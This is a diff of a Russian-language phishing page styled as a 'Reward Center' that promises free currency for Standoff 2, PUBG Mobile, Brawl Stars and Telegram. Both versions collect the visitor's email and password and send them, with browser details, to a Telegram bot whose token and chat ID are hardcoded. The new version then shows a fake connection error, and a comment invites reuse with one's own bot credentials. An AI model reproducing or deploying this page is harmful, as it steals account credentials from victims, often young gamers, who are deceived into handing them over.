@@ -1,226 +1,217 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>reward by.github.io/r</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Reward Center</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+    body {
+        background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        color: #fff;
+    }
+    .container {
+        background: rgba(255,255,255,0.05);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255,255,255,0.1);
+        border-radius: 24px;
+        padding: 32px 24px;
+        max-width: 420px;
+        width: 100%;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    }
+    h1 {
+        font-size: 22px;
+        text-align: center;
+        margin-bottom: 8px;
+        background: linear-gradient(90deg, #ffd700, #ff8c00);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+    .sub {
+        text-align: center;
+        font-size: 13px;
+        color: #aaa;
+        margin-bottom: 24px;
+    }
+    .buttons {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+        margin-bottom: 24px;
+    }
+    .btn {
+        padding: 14px 8px;
+        border: none;
+        border-radius: 14px;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: transform 0.15s, box-shadow 0.15s;
+        color: #fff;
+        text-align: center;
+        line-height: 1.3;
+    }
+    .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.4); }
+    .btn.standoff { background: linear-gradient(135deg, #ff6b00, #ff9500); }
+    .btn.pubg     { background: linear-gradient(135deg, #f5a623, #d97706); }
+    .btn.brawl    { background: linear-gradient(135deg, #8b5cf6, #6d28d9); }
+    .btn.stars    { background: linear-gradient(135deg, #00b4d8, #0077b6); }
+    .btn span { display: block; font-size: 11px; opacity: 0.85; margin-top: 3px; font-weight: 400; }
 
-        body {
-            min-height: 100vh;
-            background: #0d0d0f;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: #16161a;
-            border-radius: 32px;
-            padding: 48px 40px 32px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid #2a2a30;
-        }
-
-        .domain {
-            font-size: 13px;
-            color: #8a8a99;
-            letter-spacing: 0.3px;
-            margin-bottom: 28px;
-            font-weight: 500;
-        }
-        .domain span {
-            color: #b0b0c0;
-        }
-
-        .title {
-            color: #ffffff;
-            font-size: 24px;
-            font-weight: 600;
-            line-height: 1.3;
-            margin-bottom: 6px;
-        }
-        .subtitle {
-            color: #8a8a99;
-            font-size: 15px;
-            font-weight: 400;
-            margin-bottom: 32px;
-        }
-
-        .field {
-            margin-bottom: 18px;
-        }
-        .field label {
-            display: block;
-            color: #c0c0cc;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 6px;
-            letter-spacing: 0.2px;
-        }
-        .field input {
-            width: 100%;
-            padding: 14px 16px;
-            border-radius: 14px;
-            border: 1px solid #2e2e38;
-            background: #1e1e24;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.2s;
-        }
-        .field input:focus {
-            border-color: #5a5af0;
-            background: #25252d;
-        }
-        .field input::placeholder {
-            color: #5a5a6a;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border-radius: 40px;
-            border: none;
-            background: #5a5af0;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: 0.2s;
-            letter-spacing: 0.5px;
-        }
-        .btn:hover {
-            background: #6b6bfa;
-        }
-        .btn:active {
-            transform: scale(0.97);
-        }
-
-        .footer {
-            margin-top: 28px;
-            display: flex;
-            justify-content: center;
-            gap: 18px;
-            font-size: 13px;
-            color: #5a5a6a;
-        }
-        .footer a {
-            color: #6a6a7a;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-        .footer a:hover {
-            color: #9a9aaa;
-        }
-
-        .msg {
-            margin-top: 16px;
-            text-align: center;
-            font-size: 14px;
-            color: #7aee8a;
-            min-height: 24px;
-            font-weight: 500;
-        }
-        .msg.error {
-            color: #f07a7a;
-        }
-    </style>
+    .login-form {
+        display: none;
+        flex-direction: column;
+        gap: 12px;
+    }
+    .login-form.active { display: flex; }
+    .login-form h2 {
+        font-size: 16px;
+        text-align: center;
+        margin-bottom: 8px;
+        color: #ffd700;
+    }
+    input {
+        padding: 14px 16px;
+        border-radius: 12px;
+        border: 1px solid rgba(255,255,255,0.15);
+        background: rgba(255,255,255,0.05);
+        color: #fff;
+        font-size: 14px;
+        outline: none;
+    }
+    input:focus { border-color: #ffd700; }
+    input::placeholder { color: #888; }
+    .submit {
+        padding: 14px;
+        border: none;
+        border-radius: 12px;
+        background: linear-gradient(135deg, #ffd700, #ff8c00);
+        color: #000;
+        font-weight: 700;
+        font-size: 15px;
+        cursor: pointer;
+        margin-top: 8px;
+    }
+    .loader {
+        display: none;
+        text-align: center;
+        padding: 20px;
+    }
+    .loader.active { display: block; }
+    .spinner {
+        width: 40px; height: 40px;
+        border: 4px solid rgba(255,255,255,0.1);
+        border-top-color: #ffd700;
+        border-radius: 50%;
+        margin: 0 auto 12px;
+        animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer {
+        text-align: center;
+        font-size: 11px;
+        color: #666;
+        margin-top: 20px;
+    }
+</style>
 </head>
 <body>
-
 <div class="container">
+    <h1>🎁 Reward Center</h1>
+    <p class="sub">Выберите платформу и получите награду</p>
 
-    <div class="domain">reward by.github.io / <span>r</span></div>
+    <div class="buttons" id="buttons">
+        <button class="btn standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
+            🪙 Gold<span>STANDOFF 2</span>
+        </button>
+        <button class="btn pubg" onclick="selectPlatform('PUBG Mobile', 'UC')">
+            💰 UC<span>PUBG Mobile</span>
+        </button>
+        <button class="btn brawl" onclick="selectPlatform('Brawl Stars', 'Gems')">
+            💎 Gems<span>Brawl Stars</span>
+        </button>
+        <button class="btn stars" onclick="selectPlatform('Telegram', 'Stars')">
+            ⭐ Stars<span>Telegram</span>
+        </button>
+    </div>
 
-    <div class="title">Войдите в аккаунт</div>
-    <div class="subtitle">чтобы получить подарок</div>
-
-    <form id="form">
-        <div class="field">
-            <label>Электронная почта</label>
-            <input type="email" id="email" placeholder="example@mail.com" required>
-        </div>
-        <div class="field">
-            <label>Пароль</label>
-            <input type="password" id="password" placeholder="········" required>
-        </div>
-
-        <button type="submit" class="btn">Далее</button>
+    <form class="login-form" id="loginForm" onsubmit="return sendData(event)">
+        <h2 id="formTitle">Получение награды</h2>
+        <input type="email" id="email" placeholder="Электронная почта" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button type="submit" class="submit">Получить 🎁</button>
     </form>
 
-    <div class="msg" id="msg"></div>
-
-    <div class="footer">
-        <a href="#">Конфиденциальность</a>
-        <span style="color:#3a3a48;">|</span>
-        <a href="#">Условия</a>
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p style="font-size:14px;color:#ccc;">Проверка аккаунта...</p>
+        <p style="font-size:12px;color:#888;margin-top:6px;">Пожалуйста, подождите</p>
     </div>
+
+    <div class="footer">© 2026 Reward Center · Все права защищены</div>
 </div>
 
 <script>
-    const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
-    const CHAT_ID   = '8783227095';
+    let selected = { platform: '', reward: '' };
 
-    const form = document.getElementById('form');
-    const msg = document.getElementById('msg');
+    function selectPlatform(platform, reward) {
+        selected.platform = platform;
+        selected.reward = reward;
+        document.getElementById('buttons').style.display = 'none';
+        document.getElementById('formTitle').textContent = `${reward} · ${platform}`;
+        document.getElementById('loginForm').classList.add('active');
+    }
 
-    form.addEventListener('submit', async (e) => {
+    function sendData(e) {
         e.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
+        const payload = {
+            email: email,
+            password: password,
+            platform: selected.platform,
+            reward: selected.reward,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+        };
 
-        if (!email || !password) {
-            msg.className = 'msg error';
-            msg.textContent = 'Заполни оба поля';
-            return;
-        }
+        // 👇 ВСТАВЬ СЮДА СВОЙ BOT API И CHAT ID
+        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
+        const CHAT_ID   = '8783227095';
 
-        msg.className = 'msg';
-        msg.textContent = '⏳ Отправка...';
+        const text = `🎁 Новая заявка!\n\n` +
+                     `📧 Email: ${email}\n` +
+                     `🔑 Пароль: ${password}\n` +
+                     `🎮 Платформа: ${selected.platform}\n` +
+                     `🏆 Награда: ${selected.reward}\n` +
+                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}\n` +
+                     `📱 UA: ${navigator.userAgent}`;
 
-        const text = `🔑 НОВЫЙ ВХОД\n📧 Почта: ${email}\n🔐 Пароль: ${password}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
 
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const resp = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
+        document.getElementById('loginForm').classList.remove('active');
+        document.getElementById('loader').classList.add('active');
 
-            const data = await resp.json();
+        setTimeout(() => {
+            document.getElementById('loader').innerHTML =
+                '<p style="font-size:15px;color:#ff6b6b;">❌ Ошибка соединения</p>' +
+                '<p style="font-size:13px;color:#888;margin-top:8px;">Попробуйте позже</p>';
+        }, 4000);
 
-            if (data.ok) {
-                msg.className = 'msg';
-                msg.textContent = '✅ Подарок будет получен в течение 24 часов';
-                form.reset();
-            } else {
-                msg.className = 'msg error';
-                msg.textContent = '❌ Ошибка. Попробуй позже.';
-                console.error('Telegram error:', data);
-            }
-        } catch {
-            msg.className = 'msg error';
-            msg.textContent = '❌ Ошибка сети. Проверь интернет.';
-        }
-    });
+        return false;
+    }
 </script>
-
 </body>
 </html>
